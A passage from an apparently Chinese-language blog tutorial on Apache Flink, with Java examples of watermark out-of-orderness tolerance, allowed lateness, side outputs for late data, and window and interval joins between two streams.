</h3><p><strong>推迟水印推进</strong></p><p>在水印产生时，设置一个乱序容忍度，推迟系统时间的推进，保证窗口计算被延迟执行，为乱序的数据争取更多的时间进入窗口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WatermarkStrategy.forBoundedOutOfOrderness(Duration.ofSeconds(<span class="number">10</span>));</span><br></pre></td></tr></table></figure><p><strong>设置窗口延迟关闭</strong></p><p>Flink的窗口，也允许迟到数据。当触发了窗口计算后，会先计算当前的结果，但是此时并不会关闭窗口。以后每来一条迟到数据，就触发一次这条数据所在窗口计算(增量计算)。直到wartermark 超过了窗口结束时间+推迟时间，此时窗口会真正关闭</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 允许迟到只能运用在event time上</span></span><br><span class="line">.window(TumblingEventTimeWindows.of(Time.seconds(<span class="number">5</span>)))</span><br><span class="line">.allowedLateness(Time.seconds(<span class="number">3</span>))</span><br></pre></td></tr></table></figure><p><strong>使用侧流接收迟到的数据</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">.windowAll(TumblingEventTimeWindows.of(Time.seconds(<span class="number">5</span>)))</span><br><span class="line">.allowedLateness(Time.seconds(<span class="number">3</span>))</span><br><span class="line">.sideOutputLateData(lateWS)</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WatermarkLateDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line">        </span><br><span class="line">        SingleOutputStreamOperator&lt;WaterSensor&gt; sensorDS = env</span><br><span class="line">                .socketTextStream(<span class="string">"hadoop102"</span>, <span class="number">7777</span>)</span><br><span class="line">                .map(<span class="keyword">new</span> WaterSensorMapFunction());</span><br><span class="line"></span><br><span class="line">        WatermarkStrategy&lt;WaterSensor&gt; watermarkStrategy = WatermarkStrategy</span><br><span class="line">                .&lt;WaterSensor&gt;forBoundedOutOfOrderness(Duration.ofSeconds(<span class="number">3</span>))</span><br><span class="line">                .withTimestampAssigner((element, recordTimestamp) -&gt; element.getTs() * <span class="number">1000L</span>);</span><br><span class="line"></span><br><span class="line">        SingleOutputStreamOperator&lt;WaterSensor&gt; sensorDSwithWatermark = sensorDS.assignTimestampsAndWatermarks(watermarkStrategy);</span><br><span class="line">        OutputTag&lt;WaterSensor&gt; lateTag = <span class="keyword">new</span> OutputTag&lt;&gt;(<span class="string">"late-data"</span>, Types.POJO(WaterSensor<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line"></span><br><span class="line">        SingleOutputStreamOperator&lt;String&gt; process = sensorDSwithWatermark.keyBy(sensor -&gt; sensor.getId())</span><br><span class="line">                .window(TumblingEventTimeWindows.of(Time.seconds(<span class="number">10</span>)))</span><br><span class="line">                .allowedLateness(Time.seconds(<span class="number">2</span>)) <span class="comment">// 推迟2s关窗</span></span><br><span class="line">                .sideOutputLateData(lateTag) <span class="comment">// 关窗后的迟到数据，放入侧输出流</span></span><br><span class="line">                .process(</span><br><span class="line">                        <span class="keyword">new</span> ProcessWindowFunction&lt;WaterSensor, String, String, TimeWindow&gt;() &#123;</span><br><span class="line"></span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(String s, Context context, Iterable&lt;WaterSensor&gt; elements, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                                <span class="keyword">long</span> startTs = context.window().getStart();</span><br><span class="line">                                <span class="keyword">long</span> endTs = context.window().getEnd();</span><br><span class="line">                                String windowStart = DateFormatUtils.format(startTs, <span class="string">"yyyy-MM-dd HH:mm:ss.SSS"</span>);</span><br><span class="line">                                String windowEnd = DateFormatUtils.format(endTs, <span class="string">"yyyy-MM-dd HH:mm:ss.SSS"</span>);</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">long</span> count = elements.spliterator().estimateSize();</span><br><span class="line"></span><br><span class="line">                                out.collect(<span class="string">"key="</span> + s + <span class="string">"的窗口["</span> + windowStart + <span class="string">","</span> + windowEnd + <span class="string">")包含"</span> + count + <span class="string">"条数据===&gt;"</span> + elements.toString());</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                );</span><br><span class="line">        process.print();</span><br><span class="line">        <span class="comment">// 从主流获取侧输出流，打印</span></span><br><span class="line">        process.getSideOutput(lateTag).printToErr(<span class="string">"关窗后的迟到数据"</span>);</span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4、基于时间的合流——双流联结（Join）">4、基于时间的合流——双流联结（Join）</h2><h3 id="4-1-窗口联结（Window-Join）">4.1 窗口联结（Window Join）</h3><p>Flink为基于一段时间的双流合并专门提供了一个窗口联结算子，可以定义时间窗口，并将两条流中共享一个公共键（key）的数据放在窗口中进行配对处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// where()的参数是键选择器（KeySelector），用来指定第一条流中的key；而.equalTo()传入的KeySelector则指定了第二条流中的key。两者相同的元素，如果在同一窗口中，就可以匹配起来，并通过一个“联结函数”（JoinFunction）进行处理了</span></span><br><span class="line">stream1.join(stream2)</span><br><span class="line">        .where(&lt;KeySelector&gt;)</span><br><span class="line">        .equalTo(&lt;KeySelector&gt;)</span><br><span class="line">        .window(&lt;WindowAssigner&gt;)</span><br><span class="line">        .apply(&lt;JoinFunction&gt;)</span><br><span class="line">        </span><br><span class="line"><span class="comment">// 窗口join的调用语法和我们熟悉的SQL中表的join非常相似</span></span><br><span class="line">SELECT * FROM table1 t1, table2 t2 WHERE t1.id = t2.id;</span><br></pre></td></tr></table></figure><p>举个例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WindowJoinDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        SingleOutputStreamOperator&lt;Tuple2&lt;String, Integer&gt;&gt; ds1 = env</span><br><span class="line">                .fromElements(</span><br><span class="line">                        Tuple2.of(<span class="string">"a"</span>, <span class="number">1</span>),</span><br><span class="line">                        Tuple2.of(<span class="string">"a"</span>, <span class="number">2</span>),</span><br><span class="line">                        Tuple2.of(<span class="string">"b"</span>, <span class="number">3</span>),</span><br><span class="line">                        Tuple2.of(<span class="string">"c"</span>, <span class="number">4</span>)</span><br><span class="line">                )</span><br><span class="line">                .assignTimestampsAndWatermarks(</span><br><span class="line">                        WatermarkStrategy</span><br><span class="line">                                .&lt;Tuple2&lt;String, Integer&gt;&gt;forMonotonousTimestamps()</span><br><span class="line">                                .withTimestampAssigner((value, ts) -&gt; value.f1 * <span class="number">1000L</span>)</span><br><span class="line">                );</span><br><span class="line"></span><br><span class="line">        SingleOutputStreamOperator&lt;Tuple3&lt;String, Integer,Integer&gt;&gt; ds2 = env</span><br><span class="line">                .fromElements(</span><br><span class="line">                        Tuple3.of(<span class="string">"a"</span>, <span class="number">1</span>,<span class="number">1</span>),</span><br><span class="line">                        Tuple3.of(<span class="string">"a"</span>, <span class="number">11</span>,<span class="number">1</span>),</span><br><span class="line">                        Tuple3.of(<span class="string">"b"</span>, <span class="number">2</span>,<span class="number">1</span>),</span><br><span class="line">                        Tuple3.of(<span class="string">"b"</span>, <span class="number">12</span>,<span class="number">1</span>),</span><br><span class="line">                        Tuple3.of(<span class="string">"c"</span>, <span class="number">14</span>,<span class="number">1</span>),</span><br><span class="line">                        Tuple3.of(<span class="string">"d"</span>, <span class="number">15</span>,<span class="number">1</span>)</span><br><span class="line">                )</span><br><span class="line">                .assignTimestampsAndWatermarks(</span><br><span class="line">                        WatermarkStrategy</span><br><span class="line">                                .&lt;Tuple3&lt;String, Integer,Integer&gt;&gt;forMonotonousTimestamps()</span><br><span class="line">                                .withTimestampAssigner((value, ts) -&gt; value.f1 * <span class="number">1000L</span>)</span><br><span class="line">                );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO window join</span></span><br><span class="line">        <span class="comment">// 1. 落在同一个时间窗口范围内才能匹配</span></span><br><span class="line">        <span class="comment">// 2. 根据keyby的key，来进行匹配关联</span></span><br><span class="line">        <span class="comment">// 3. 只能拿到匹配上的数据，类似有固定时间范围的inner join</span></span><br><span class="line">        DataStream&lt;String&gt; join = ds1.join(ds2)</span><br><span class="line">                .where(r1 -&gt; r1.f0)  <span class="comment">// ds1的keyby</span></span><br><span class="line">                .equalTo(r2 -&gt; r2.f0) <span class="comment">// ds2的keyby</span></span><br><span class="line">                .window(TumblingEventTimeWindows.of(Time.seconds(<span class="number">10</span>)))</span><br><span class="line">                .apply(<span class="keyword">new</span> JoinFunction&lt;Tuple2&lt;String, Integer&gt;, Tuple3&lt;String, Integer, Integer&gt;, String&gt;() &#123;</span><br><span class="line">                    <span class="comment">/**</span></span><br><span class="line"><span class="comment">                     * 关联上的数据，调用join方法</span></span><br><span class="line"><span class="comment">                     * <span class="doctag">@param</span> first  ds1的数据</span></span><br><span class="line"><span class="comment">                     * <span class="doctag">@param</span> second ds2的数据</span></span><br><span class="line"><span class="comment">                     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">                     * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> String <span class="title">join</span><span class="params">(Tuple2&lt;String, Integer&gt; first, Tuple3&lt;String, Integer, Integer&gt; second)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> first + <span class="string">"&lt;-----&gt;"</span> + second;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">        join.print();</span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-2-间隔联结（Interval-Join）">4.2 间隔联结（Interval Join）</h3><p>间隔联结具体的定义方式是，我们给定两个时间点，分别叫作间隔的“上界”（upperBound）和“下界”（lowerBound）；于是对于一条流（不妨叫作A）中的任意一个数据元素a，就可以开辟一段时间间隔：[a.timestamp + lowerBound, a.timestamp + upperBound],即以a的时间戳为中心，下至下界点、上至上界点的一个闭区间：我们就把这段时间作为可以匹配另一条流数据的“窗口”范围</p><p><img src="http://qnypic.shawncoding.top/blog/202404161646760.png" alt></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 间隔联结在代码中，是基于KeyedStream的联结（join）操作</span></span><br><span class="line"><span class="comment">// 通用调用</span></span><br><span class="line">stream1</span><br><span class="line">    .keyBy(&lt;KeySelector&gt;)</span><br><span class="line">    .intervalJoin(stream2.keyBy(&lt;KeySelector&gt;))</span><br><span class="line">    .between(Time.milliseconds(-<span class="number">2</span>), Time.milliseconds(<span class="number">1</span>))</span><br><span class="line">    .process (<span class="keyword">new</span> ProcessJoinFunction&lt;Integer, Integer, String()&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(Integer left, Integer right, Context ctx, Collector&lt;String&gt; out)</span> </span>&#123;</span><br><span class="line">            out.collect(left + <span class="string">","</span> + right);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>实例演示</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 正常使用</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IntervalJoinDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        SingleOutputStreamOperator&lt;Tuple2&lt;String, Integer&gt;&gt; ds1 = env</span><br><span class="line">                .fromElements(</span><br><span class="line">                        Tuple2.of(<span class="string">"a"</span>, <span class="number">1</span>),</span><br><span class="line">                        Tuple2.of(<span class="string">"a"</span>, <span class="number">2</span>),</span><br><span class="line">                        Tuple2.of(<span class="string">"b"</span>, <span class="number">3</span>),</span><br><span class="line">                        Tuple2.of(<span class="string">"c"</span>, <span class="number">4</span>)</span><br><span class="line">                )</span><br><span class="line">                .assignTimestampsAndWatermarks(</span><br><span class="line">                        WatermarkStrategy</span><br><span class="line">                                .&lt;Tuple2&lt;String, Integer&gt;&gt;forMonotonousTimestamps()</span><br><span class="line">                                .withTimestampAssigner((value, ts) -&gt; value.f1 * <span class="number">1000L</span>)</span><br><span class="line">                );</span><br><span class="line"></span><br><span class="line">        SingleOutputStreamOperator&lt;Tuple3&lt;String, Integer, Integer&gt;&gt; ds2 = env</span><br><span class="line">                .fromElements(</span><br><span class="line">                        Tuple3.of(<span class="string">"a"</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">                        Tuple3.of(<span class="string">"a"</span>, <span class="number">11</span>, <span class="number">1</span>),</span><br><span class="line">                        Tuple3.of(<span class="string">"b"</span>, <span class="number">2</span>, <span class="number">1</span>),</span><br><span class="line">                        Tuple3.of(<span class="string">"b"</span>, <span class="number">12</span>, <span class="number">1</span>),</span><br><span class="line">                        Tuple3.of(<span class="string">"c"</span>, <span class="number">14</span>, <span class="number">1</span>),</span><br><span class="line">                        Tuple3.of(<span class="string">"d"</span>, <span class="number">15</span>, <span class="number">1</span>)</span><br><span class="line">                )</span><br><span class="line">                .assignTimestampsAndWatermarks(</span><br><span class="line">                        WatermarkStrategy</span><br><span class="line">                                .&lt;Tuple3&lt;String, Integer, Integer&gt;&gt;forMonotonousTimestamps()</span><br><span class="line">                                .withTimestampAssigner((value, ts) -&gt; value.f1 * <span class="number">1000L</span>)</span><br><span class="line">                );</span><br><span class="line">        <span class="comment">// TODO interval join</span></span><br><span class="line">        <span class="comment">//1. 分别做keyby，key其实就是关联条件</span></span><br><span class="line">        KeyedStream&lt;Tuple2&lt;String, Integer&gt;, String&gt; ks1 = ds1.keyBy(r1 -&gt; r1.f0);</span><br><span class="line">        KeyedStream&lt;Tuple3&lt;String, Integer, Integer&gt;, String&gt; ks2 = ds2.keyBy(r2 -&gt; r2.f0);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2. 调用 interval join</span></span><br><span class="line">        ks1.intervalJoin(ks2)</span><br><span class="line">                .between(Time.seconds(-<span class="number">2</span>), Time.seconds(<span class="number">2</span>))</span><br><span class="line">                .process(</span><br><span class="line">                        <span class="keyword">new</span> ProcessJoinFunction&lt;Tuple2&lt;String, Integer&gt;, Tuple3&lt;String, Integer, Integer&gt;, String&gt;() &#123;</span><br><span class="line">                            <span class="comment">/**</span></span><br><span class="line"><span class="comment">                             * 两条流的数据匹配上，才会调用这个方法</span></span><br><span class="line"><span class="comment">                             * <span class="doctag">@param</span> left  ks1的数据</span></span><br><span class="line"><span class="comment">                             * <span class="doctag">@param</span> right ks2的数据</span></span><br><span class="line"><span class="comment">                             * <span class="doctag">@param</span> ctx   上下文</span></span><br><span class="line"><span class="comment">                             * <span class="doctag">@param</span> out   采集器</span></span><br><span class="line"><span class="comment">                             * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">                             */</span></span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(Tuple2&lt;String, Integer&gt; left, Tuple3&lt;String, Integer, Integer&gt; right, Context ctx, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                                <span class="comment">// 进入这个方法，是关联上的数据</span></span><br><span class="line">                                out.collect(left + <span class="string">"&lt;------&gt;"</span> + right);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;)</span><br><span class="line">                .print();</span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理迟到数据</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IntervalJoinWithLateDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        SingleOutputStreamOperator&lt;Tuple2&lt;String, Integer&gt;&gt; ds1 = env</span><br><span class="line">                .socketTextStream(<span class="string">"hadoop102"</span>, <span class="number">7777</span>)</span><br><span class="line">                .map(<span class="keyword">new</span> MapFunction&lt;String, Tuple2&lt;String, Integer&gt;&gt;() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> Tuple2&lt;String, Integer&gt; <span class="title">map</span><span class="params">(String value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                        String[] datas = value.split(<span class="string">","</span>);</span><br><span class="line">                        <span class="keyword">return</span> Tuple2.of(datas[<span class="number">0</span>], Integer.valueOf(datas[<span class="number">1</span>]));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">                .assignTimestampsAndWatermarks(</span><br><span class="line">                        WatermarkStrategy</span><br><span class="line">                                .&lt;Tuple2&lt;String, Integer&gt;&gt;forBoundedOutOfOrderness(Duration.ofSeconds(<span class="number">3</span>))</span><br><span class="line">                                .withTimestampAssigner((value, ts) -&gt; value.f1 * <span class="number">1000L</span>)</span><br><span class="line">                );</span><br><span class="line"></span><br><span class="line">        SingleOutputStreamOperator&lt;Tuple3&lt;String, Integer, Integer&gt;&gt; ds2 = env</span><br><span class="line">                .socketTextStream(<span class="string">"hadoop102"</span>, <span class="number">8888</span>)</span><br><span class="line">                .map(<span class="keyword">new</span> MapFunction&lt;String, Tuple3&lt;String, Integer, Integer&gt;&gt;() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> Tuple3&lt;String, Integer, Integer&gt; <span class="title">map</span><span class="params">(String value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                        String[] datas = value.split(<span class="string">","</span>);</span><br><span class="line">                        <span class="keyword">return</span> Tuple3.of(datas[<span class="number">0</span>], Integer.valueOf(datas[<span class="number">1</span>]), Integer.valueOf(datas[<span class="number">2</span>]));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">                .assignTimestampsAndWatermarks(</span><br><span class="line">                        WatermarkStrategy</span><br><span class="line">                                .&lt;Tuple3&lt;String, Integer, Integer&gt;&gt;forBoundedOutOfOrderness(Duration.ofSeconds(<span class="number">3</span>))</span><br><span class="line">                                .withTimestampAssigner((value, ts) -&gt; value.f1 * <span class="number">1000L</span>)</span><br><span class="line">                );</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * TODO Interval join</span></span><br><span class="line"><span class="comment">         * 1、只支持事件时间</span></span><br><span class="line"><span class="comment">         * 2、指定上界、下界的偏移，负号代表时间往前，正号代表时间往后</span></span><br><span class="line"><span class="comment">         * 3、process中，只能处理 join上的数据</span></span><br><span class="line"><span class="comment">         * 4、两条流关联后的watermark，以两条流中最小的为准</span></span><br><span class="line"><span class="comment">         * 5、如果 当前数据的事件时间 &lt; 当前的watermark，就是迟到数据， 主流的process不处理</span></span><br><span class="line"><span class="comment">         *  =&gt; between后，可以指定将 左流 或 右流 的迟到数据 放入侧输出流</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//1. 分别做keyby，key其实就是关联条件</span></span><br><span class="line">        KeyedStream&lt;Tuple2&lt;String, Integer&gt;, String&gt; ks1 = ds1.keyBy(r1 -&gt; r1.f0);</span><br><span class="line">        KeyedStream&lt;Tuple3&lt;String, Integer, Integer&gt;, String&gt; ks2 = ds2.keyBy(r2 -&gt; r2.f0);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2. 调用 interval join</span></span><br><span class="line">        OutputTag&lt;Tuple2&lt;String, Integer&gt;&gt; ks1LateTag = <span class="keyword">new</span> OutputTag&lt;&gt;(<span class="string">"ks1-late"</span>, Types.TUPLE(Types.STRING, Types.INT));</span><br><span class="line">        OutputTag&lt;Tuple3&lt;String, Integer, Integer&gt;&gt; ks2LateTag = <span class="keyword">new</span> OutputTag&lt;&gt;(<span class="string">"ks2-late"</span>, Types.TUPLE(Types.STRING, Types.INT, Types.INT));</span><br><span class="line">        SingleOutputStreamOperator&lt;String&gt; process = ks1.intervalJoin(ks2)</span><br><span class="line">                .between(Time.seconds(-<span class="number">2</span>), Time.seconds(<span class="number">2</span>))</span><br><span class="line">                .sideOutputLeftLateData(ks1LateTag)  <span class="comment">// 将 ks1的迟到数据，放入侧输出流</span></span><br><span class="line">                .sideOutputRightLateData(ks2LateTag) <span class="comment">// 将 ks2的迟到数据，放入侧输出流</span></span><br><span class="line">                .process(</span><br><span class="line">                        <span class="keyword">new</span> ProcessJoinFunction&lt;Tuple2&lt;String, Integer&gt;, Tuple3&lt;String, Integer, Integer&gt;, String&gt;() &#123;</span><br><span class="line">                            <span class="comment">/**</span></span><br><span class="line"><span class="comment">                             * 两条流的数据匹配上，才会调用这个方法</span></span><br><span class="line"><span class="comment">                             * <span class="doctag">@param</span> left  ks1的数据</span></span><br><span class="line"><span class="comment">                             * <span class="doctag">@param</span> right ks2的数据</span></span><br><span class="line"><span class="comment">                             * <span class="doctag">@param</span> ctx   上下文</span></span><br><span class="line"><span class="comment">                             * <span class="doctag">@param</span> out   采集器</span></span><br><span class="line"><span class="comment">                             * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">                             */</span></span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(Tuple2&lt;String, Integer&gt; left, Tuple3&lt;String, Integer, Integer&gt; right, Context ctx, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                                <span class="comment">// 进入这个方法，是关联上的数据</span></span><br><span class="line">                                out.collect(left + <span class="string">"&lt;------&gt;"</span> + right);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;);</span><br><span class="line"></span><br><span class="line">        process.print(<span class="string">"主流"</span>);</span><br><span class="line">        